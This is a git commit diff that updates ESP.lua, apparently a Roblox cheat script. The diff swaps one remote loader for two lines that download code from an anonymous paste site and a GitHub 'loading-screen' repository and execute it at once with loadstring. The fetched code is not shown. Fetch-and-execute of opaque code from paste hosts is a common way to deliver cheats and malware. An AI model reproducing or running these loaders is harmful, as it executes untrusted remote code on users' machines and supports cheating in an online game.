0d64c43086c3d99aa7cad8bf7a8531adafcca119
NoLag-id <sfpher6@gmail.com>
2025-07-24 23:50:55 +0800

    Update ESP.lua

--- ESP.lua
+++ ESP.lua
@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/rJV3fQwgPk/0", true))()
+loadstring(game:HttpGet("https://paste.debian.net/plainh/7c11e007/", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/azbalalaff/loading-screen/refs/heads/main/loader.lua"))()
